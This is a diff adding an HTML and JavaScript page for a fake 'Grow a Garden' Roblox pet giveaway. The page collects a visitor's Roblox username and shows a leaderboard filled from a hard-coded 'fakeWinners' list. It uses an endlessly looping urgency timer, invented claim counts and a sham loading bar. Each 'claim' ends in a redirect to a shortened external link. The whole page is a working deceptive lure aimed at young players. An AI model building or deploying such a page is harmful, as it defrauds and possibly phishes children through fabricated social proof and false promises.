@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GAG REWARDS!</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background: linear-gradient(to bottom, #4b2e18, #32200f);
+      font-family: 'Press Start 2P', monospace;
+      color: #fffbe0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    .title {
+      font-size: clamp(14px, 5vw, 28px);
+      color: #00ff00;
+      text-align: center;
+      text-shadow: 0 0 5px #00ff00, 0 0 10px #00b300;
+      animation: bounce 2s infinite ease-in-out;
+      margin-bottom: 10px;
+    }
+
+    .subtext {
+      font-size: 10px;
+      color: #ccc;
+      margin-bottom: 20px;
+    }
+
+    .main-wrapper {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
+      align-items: flex-start;
+      width: 100%;
+      max-width: 960px;
+    }
+
+    .username-section {
+      background-color: #5d3a00;
+      border: 4px solid #d8b07c;
+      padding: 20px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 0 20px #000;
+      margin-bottom: 20px;
+    }
+
+    .username-section h2 {
+      font-size: clamp(10px, 4vw, 16px);
+      color: #ffd700;
+      margin-bottom: 15px;
+    }
+
+    .username-input {
+      width: 100%;
+      padding: 12px;
+      font-family: 'Press Start 2P', monospace;
+      font-size: 10px;
+      background: #3a2200;
+      border: 2px solid #d8b07c;
+      color: #fffbe0;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .connect-btn {
+      font-family: 'Press Start 2P', monospace;
+      font-size: 10px;
+      background-color: #4285f4;
+      color: #fff;
+      border: 2px solid #fffbe0;
+      padding: 12px 24px;
+      cursor: pointer;
+      width: 100%;
+      transition: 0.2s;
+    }
+
+    .connect-btn:hover {
+      background-color: #3367d6;
+    }
+
+    .connect-btn:disabled {
+      background-color: #888;
+      cursor: not-allowed;
+    }
+
+    .pets-section {
+      display: none;
+      width: 100%;
+      max-width: 800px;
+    }
+
+    .timer-banner {
+      background: linear-gradient(45deg, #ff4444, #cc0000);
+      color: white;
+      text-align: center;
+      padding: 15px;
+      margin-bottom: 20px;
+      border: 3px solid #fff;
+      font-size: 12px;
+      animation: glow 1s infinite alternate;
+    }
+
+    .limited-pet {
+      background: linear-gradient(45deg, #8b44e8, #6a1b99);
+      border: 3px solid #ffd700;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .limited-badge {
+      position: absolute;
+      top: -10px;
+      right: -10px;
+      background: #ff4444;
+      color: white;
+      font-size: 8px;
+      padding: 5px 10px;
+      border: 2px solid #fff;
+      transform: rotate(15deg);
+    }
+
+    .limited-pet img {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 10px;
+    }
+
+    .limited-pet h3 {
+      color: #ffd700;
+      font-size: 12px;
+      margin-bottom: 15px;
+    }
+
+    .pets-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    .pet-card {
+      background: #00aa44;
+      border: 3px solid #fff;
+      padding: 15px;
+      text-align: center;
+      cursor: pointer;
+      transition: 0.2s;
+      position: relative;
+    }
+
+    .pet-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+    }
+
+    .pet-card img {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 10px;
+      image-rendering: pixelated;
+    }
+
+    .pet-card h4 {
+      font-size: 8px;
+      color: white;
+      margin-bottom: 10px;
+    }
+
+    .pet-count {
+      background: rgba(0,0,0,0.8);
+      color: white;
+      font-size: 8px;
+      padding: 5px;
+      border-radius: 3px;
+      margin-bottom: 10px;
+    }
+
+    .amount-input {
+      width: 60px;
+      padding: 5px;
+      font-family: 'Press Start 2P', monospace;
+      font-size: 8px;
+      background: #2a2a2a;
+      border: 1px solid #fff;
+      color: #fff;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .claim-btn {
+      font-family: 'Press Start 2P', monospace;
+      font-size: 8px;
+      background-color: #ff4444;
+      color: white;
+      border: 2px solid #fff;
+      padding: 8px 12px;
+      cursor: pointer;
+      width: 100%;
+      transition: 0.2s;
+    }
+
+    .claim-btn:hover {
+      background-color: #cc0000;
+    }
+
+    .section-title {
+      font-size: 16px;
+      color: #ff8800;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    #leaderboard {
+      background-color: #3a2200;
+      border: 3px solid #d8b07c;
+      padding: 15px;
+      margin-top: 0;
+      max-width: 360px;
+      width: 100%;
+      height: 360px;
+      overflow-y: auto;
+      text-align: left;
+      animation: glow 1.5s infinite alternate;
+      scroll-behavior: smooth;
+    }
+
+    #leaderboard h2 {
+      font-size: 12px;
+      color: #ffd700;
+      text-align: center;
+      margin-bottom: 12px;
+    }
+
+    #leaderboardList {
+      list-style: none;
+      padding: 0;
+      font-size: 10px;
+      color: #fffbe0;
+    }
+
+    #leaderboardList li {
+      margin-bottom: 8px;
+      border-bottom: 1px dashed #8b6c40;
+      padding-bottom: 6px;
+    }
+
+    #fetching {
+      display: none;
+      font-size: clamp(10px, 3vw, 16px);
+      color: #ffffff;
+      background: #000000dd;
+      padding: 20px;
+      border: 2px solid #fff;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      width: 80%;
+      max-width: 320px;
+      transform: translate(-50%, -50%);
+      z-index: 999;
+      text-align: center;
+      border-radius: 8px;
+      animation: glow 1s infinite alternate;
+    }
+
+    #progressBar {
+      background: #444;
+      height: 16px;
+      width: 100%;
+      border: 1px solid #fff;
+      margin-top: 10px;
+    }
+
+    #progressFill {
+      background: #00ff00;
+      width: 0%;
+      height: 100%;
+      transition: width 0.2s;
+    }
+
+    #jandelThinking {
+      font-size: clamp(8px, 2.5vw, 12px);
+      margin-top: 10px;
+      color: #ffd700;
+    }
+
+    .spinner {
+      border: 4px solid #d8b07c;
+      border-top: 4px solid #00ff00;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      margin: 10px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+
+    @keyframes glow {
+      from { text-shadow: 0 0 3px #00ff00, 0 0 8px #00b300; }
+      to   { text-shadow: 0 0 6px #00ff00, 0 0 14px #00ff66; }
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="title">GROW A GARDEN</div>
+  <div class="subtext">CLAIM YOUR REWARDS NOW! ALMOST 5K PEOPLE ATTEND TO GIVEAWAYS!</div>
+
+  <div class="main-wrapper">
+    <!-- Username Input Section -->
+    <div class="username-section" id="usernameSection">
+      <h2>🎯 Enter your Roblox Username</h2>
+      <p style="font-size: 8px; margin-bottom: 15px;">No Password Required</p>
+      <input type="text" class="username-input" id="robloxUsername" placeholder="Enter your Roblox username" maxlength="20">
+      <button class="connect-btn" onclick="connectAccount()">Connect</button>
+    </div>
+
+    <!-- Pets Selection Section -->
+    <div class="pets-section" id="petsSection">
+      <div class="timer-banner">
+        ⏰ LIMITED TIME EVENT<br>
+        <strong>11:50:39</strong><br>
+        <small>Claim your rewards before time runs out!</small>
+      </div>
+
+      <div class="limited-pet">
+        <div class="limited-badge">LIMITED</div>
+        <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556668391981210/Grow-a-Garden-Jandel-Monkey-Pet.png?ex=68ce8d59&is=68cd3bd9&hm=060ae0662606605cc3e1156e40bd9546f1d3ea3e5c2572250fe4ff6ace56b1de&" alt="Jandel Monkey" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'80\' height=\'80\' viewBox=\'0 0 80 80\'%3E%3Crect width=\'80\' height=\'80\' fill=\'%238b44e8\'/%3E%3Ctext x=\'40\' y=\'45\' text-anchor=\'middle\' fill=\'%23ffd700\' font-size=\'12\'%3E🐵%3C/text%3E%3C/svg%3E'">
+        <h3>🔥 Limited Time Pet 🔥</h3>
+        <h4>👑 Jandel Monkey</h4>
+        <p style="font-size: 8px; color: #ffd700;">Limited Time Pet</p>
+        <div class="pet-count">73 🎁</div>
+        <input type="number" class="amount-input" id="jandel-amount" min="1" max="99" value="1" placeholder="1" style="margin-top: 10px;">
+        <button class="claim-btn" onclick="claimPetWithAmount('Jandel Monkey', 'jandel-amount')" style="background: linear-gradient(45deg, #ff4444, #cc0000);">CLAIM LIMITED</button>
+      </div>
+
+      <div class="section-title">Awesome Pets</div>
+      <div class="pets-grid">
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418554132364656640/T-Rex.png?ex=68ce8afc&is=68cd397c&hm=5fa55203d8bb1fefef8f8ef74aa1751daeb4f0a6fbefbb17f75435b9b35f44ad&" alt="T-Rex" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'20\'%3E🦖%3C/text%3E%3C/svg%3E'">
+          <h4>T-Rex</h4>
+          <div class="pet-count">87 🎁</div>
+          <input type="number" class="amount-input" id="trex-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('T-Rex', 'trex-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556547700756520/Raccon_Better_Quality.png?ex=68ce8d3c&is=68cd3bbc&hm=600ecefca6c9a186cf8fc172bc3e897ab07d74ab0cd481463024e64276ec7e78&" alt="Raccoon" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'20\'%3E🦝%3C/text%3E%3C/svg%3E'">
+          <h4>Raccoon</h4>
+          <div class="pet-count">64 🎁</div>
+          <input type="number" class="amount-input" id="raccoon-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Raccoon', 'raccoon-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418558779724796014/FennecFoxIcon.png?ex=68ce8f50&is=68cd3dd0&hm=5c34c64486638132712016dfa8b01701d220dc3d160b5d598bfcb571ab8f8fa4&" alt="Fennec Fox" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'20\'%3E🦊%3C/text%3E%3C/svg%3E'">
+          <h4>Fennec Fox</h4>
+          <div class="pet-count">92 🎁</div>
+          <input type="number" class="amount-input" id="fennec-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Fennec Fox', 'fennec-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556572027719720/Kitsune.png?ex=68ce8d42&is=68cd3bc2&hm=f7bf8ea2ace48979d48d447ef694a1dd35b57e22cd372da6bda1422c001d1b48&" alt="Kitsune" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'16\'%3EKit%3C/text%3E%3C/svg%3E'">
+          <h4>Kitsune</h4>
+          <div class="pet-count">58 🎁</div>
+          <input type="number" class="amount-input" id="kitsune-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Kitsune', 'kitsune-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556605598924852/DragonflyIcon.png?ex=68ce8d4a&is=68cd3bca&hm=38f69b2b51945bbf9af6375b43ed1f392db84befbb5c251dc8a53d30abcce9e1&" alt="Dragonfly" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'16\'%3E🐲%3C/text%3E%3C/svg%3E'">
+          <h4>Dragonfly</h4>
+          <div class="pet-count">75 🎁</div>
+          <input type="number" class="amount-input" id="dragonfly-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Dragonfly', 'dragonfly-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556614327402637/MimicOctopusImage.png?ex=68ce8d4c&is=68cd3bcc&hm=b96cc90bc2f079de2f4cdd7e4ebcd506ec6c208f6510b6880bbf8941c5769337&" alt="Mimic Octopus" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'16\'%3E🐙%3C/text%3E%3C/svg%3E'">
+          <h4>Mimic Octopus</h4>
+          <div class="pet-count">81 🎁</div>
+          <input type="number" class="amount-input" id="octopus-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Mimic Octopus', 'octopus-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556620287246447/DiscoBeeIcon.gif?ex=68ce8d4d&is=68cd3bcd&hm=b1aed43e242a35083f353100f319928c2a599f6f218eb1e713a0861dde62f143&" alt="Disco Bee" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'20\'%3E🐝%3C/text%3E%3C/svg%3E'">
+          <h4>Disco Bee</h4>
+          <div class="pet-count">67 🎁</div>
+          <input type="number" class="amount-input" id="disco-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Disco Bee', 'disco-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556628327993486/Queen_bee.png?ex=68ce8d4f&is=68cd3bcf&hm=90a1b13b97bdca88cd015aac87428b020a6dd27df8998ffe0b88a03150ea1370&" alt="Queen Bee" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'16\'%3E👑🐝%3C/text%3E%3C/svg%3E'">
+          <h4>Queen Bee</h4>
+          <div class="pet-count">53 🎁</div>
+          <input type="number" class="amount-input" id="queen-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Queen Bee', 'queen-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556633608355920/Spinosaurus.png?ex=68ce8d50&is=68cd3bd0&hm=35c1d8c0e450f8639b2c3771c7032d5b055860344528de99d7c0d9398ff24858&" alt="Spinosaurus" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'16\'%3E🦕%3C/text%3E%3C/svg%3E'">
+          <h4>Spinosaurus</h4>
+          <div class="pet-count">96 🎁</div>
+          <input type="number" class="amount-input" id="spino-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Spinosaurus', 'spino-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556645243621449/Thy_Butterfly_V2.png?ex=68ce8d53&is=68cd3bd3&hm=358c7413a975bb92636b1b66014ab5fee04c390eef95b37781f9c85c69c91d71&" alt="Butterfly" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'20\'%3E🦋%3C/text%3E%3C/svg%3E'">
+          <h4>Butterfly</h4>
+          <div class="pet-count">72 🎁</div>
+          <input type="number" class="amount-input" id="butterfly-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Butterfly', 'butterfly-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556659973750948/FrenchFryFerret.png?ex=68ce8d57&is=68cd3bd7&hm=68ddf3c455000f57e1e0688fc2db7d1a2e100c3fb47b620cc30373120f6a93dc&" alt="French Fry Lover" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'16\'%3E🍟%3C/text%3E%3C/svg%3E'">
+          <h4>French Fry Lover</h4>
+          <div class="pet-count">89 🎁</div>
+          <input type="number" class="amount-input" id="fry-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('French Fry Lover', 'fry-amount')">CLAIM</button>
+        </div>
+
+        <div class="pet-card">
+          <img src="https://cdn.discordapp.com/attachments/1401918418826956840/1418556659973750948/GriffinPet.png?ex=68ce8d57&is=68cd3bd7&hm=05dfc4e9e562f5395c88773a3f062346d132188d9646d50b77735ea6ea1d1481&" alt="Griffin" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 60 60\'%3E%3Crect width=\'60\' height=\'60\' fill=\'%2300aa44\'/%3E%3Ctext x=\'30\' y=\'35\' text-anchor=\'middle\' fill=\'white\' font-size=\'16\'%3E🦅%3C/text%3E%3C/svg%3E'">
+          <h4>Griffin</h4>
+          <div class="pet-count">61 🎁</div>
+          <input type="number" class="amount-input" id="griffin-amount" min="1" max="99" value="1" placeholder="1">
+          <button class="claim-btn" onclick="claimPetWithAmount('Griffin', 'griffin-amount')">CLAIM</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="leaderboard">
+      <h2>LIVE CLAIMERS!</h2>
+      <ul id="leaderboardList"></ul>
+    </div>
+  </div>
+
+  <div id="fetching">
+    <div class="spinner"></div>
+    Fetching to the server... <span id="percent">1%</span>
+    <div id="progressBar">
+      <div id="progressFill"></div>
+    </div>
+    <div id="jandelThinking">PLEASE WAIT REDIRECTING YOU TO THE SERVER...</div>
+  </div>
+
+  <audio id="clickSound" src="media/audio_d00436f118.mp3"></audio>
+
+  <script src="js/confetti.browser.min.js"></script>
+  <script>
+    const fakeWinners = ["xJandelYT", "NoobMaster22", "LegendBuilder", "ProGamer69420", "PixelFarmer", "GrowHero", "UnicornPlays", "RainGrower", "justin22", "AlsherXzc", "tokizawagh", "SlayerSupremeTyt", "Lemondade66+", "Jshoay22", "Gahsyiui123", "GamerTzyy", "AintNoWayyy", "Redmiyhu88"];
+    const rewards = ["T-Rex", "Raccoon", "Fennec Fox", "Kitsune", "Dragonfly", "Mimic Octopus", "Disco Bee", "Queen Bee", "Spinosaurus", "Butterfly", "French Fry Lover", "Griffin"];
+    let intervalId;
+    let userUsername = "";
+
+    function renderNextWinner() {
+      const lbList = document.getElementById("leaderboardList");
+      const name = fakeWinners[Math.floor(Math.random() * fakeWinners.length)];
+      const reward = rewards[Math.floor(Math.random() * rewards.length)];
+      const timeStr = new Date().toLocaleTimeString();
+      const li = document.createElement("li");
+      li.innerHTML = `👤 <strong>${name}</strong> claimed <span style="color:#00ff99">${reward}</span><br><small>${timeStr}</small>`;
+      lbList.appendChild(li);
+      document.getElementById("leaderboard").scrollTop = document.getElementById("leaderboard").scrollHeight;
+    }
+
+    async function validateRobloxUsername(username) {
+      try {
+        const response = await fetch('/validate-username', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ username: username })
+        });
+
+        const result = await response.json();
+        return result.valid;
+      } catch (error) {
+        console.error("Error validating username:", error);
+        return false;
+      }
+    }
+
+    async function connectAccount() {
+      const username = document.getElementById("robloxUsername").value.trim();
+      if (username.length < 3) {
+        alert("Please enter a valid Roblox username (at least 3 characters)");
+        return;
+      }
+
+      const connectBtn = document.querySelector('.connect-btn');
+      connectBtn.disabled = true;
+      connectBtn.textContent = "Validating...";
+
+      const isValid = await validateRobloxUsername(username);
+
+      if (!isValid) {
+        alert("This Roblox username doesn't exist or couldn't be verified. Please enter a valid username and try again.");
+        connectBtn.disabled = false;
+        connectBtn.textContent = "Connect";
+        return;
+      }
+
+      userUsername = username;
+      document.getElementById("usernameSection").style.display = "none";
+      document.getElementById("petsSection").style.display = "block";
+
+      // Add user to fake winners list for more realistic leaderboard
+      fakeWinners.push(username);
+    }
+
+    function claimPetWithAmount(petName, amountInputId) {
+      if (!userUsername) {
+        alert("Please connect your Roblox account first!");
+        return;
+      }
+
+      const amountInput = document.getElementById(amountInputId);
+      const amount = parseInt(amountInput.value) || 1;
+
+      if (amount < 1 || amount > 99) {
+        alert("Please enter a valid amount between 1 and 99");
+        return;
+      }
+
+      // Play click sound if available
+      const clickSound = document.getElementById("clickSound");
+      if (clickSound) {
+        clickSound.play().catch(() => {});
+      }
+
+      // Show loading screen
+      document.getElementById("fetching").style.display = "block";
+
+      let percent = 1;
+      const interval = setInterval(() => {
+        percent++;
+        document.getElementById("percent").innerText = percent + "%";
+        document.getElementById("progressFill").style.width = percent + "%";
+
+        if (percent >= 100) {
+          clearInterval(interval);
+
+          // Add user to leaderboard with amount
+          const lbList = document.getElementById("leaderboardList");
+          const timeStr = new Date().toLocaleTimeString();
+          const li = document.createElement("li");
+          const displayText = amount > 1 ? `${amount}x ${petName}` : petName;
+          li.innerHTML = `👤 <strong>${userUsername}</strong> claimed <span style="color:#00ff99">${displayText}</span><br><small>${timeStr}</small>`;
+          lbList.appendChild(li);
+          document.getElementById("leaderboard").scrollTop = document.getElementById("leaderboard").scrollHeight;
+
+          // Redirect after a short delay
+          setTimeout(() => {
+            window.location.href = "http://short-urls.zeabur.app/b70b31";
+          }, 1000);
+        }
+      }, 25);
+    }
+
+    // Keep the old function for backwards compatibility
+    function claimPet(petName) {
+      claimPetWithAmount(petName, null);
+    }
+
+    // Update timer countdown
+    function updateTimer() {
+      const timerElement = document.querySelector('.timer-banner strong');
+      if (timerElement) {
+        let time = timerElement.textContent.split(':');
+        let hours = parseInt(time[0]);
+        let minutes = parseInt(time[1]);
+        let seconds = parseInt(time[2]);
+
+        seconds--;
+        if (seconds < 0) {
+          seconds = 59;
+          minutes--;
+          if (minutes < 0) {
+            minutes = 59;
+            hours--;
+            if (hours < 0) {
+              hours = 11;
+              minutes = 59;
+              seconds = 59;
+            }
+          }
+        }
+
+        timerElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      }
+    }
+
+    window.onload = () => {
+      renderNextWinner();
+      intervalId = setInterval(renderNextWinner, 2000);
+      setInterval(updateTimer, 1000);
+    };
+
+    // Allow Enter key to connect account
+    document.getElementById("robloxUsername").addEventListener("keypress", function(event) {
+      if (event.key === "Enter") {
+        connectAccount();
+      }
+    });
+  </script>
+</body>
+</html>
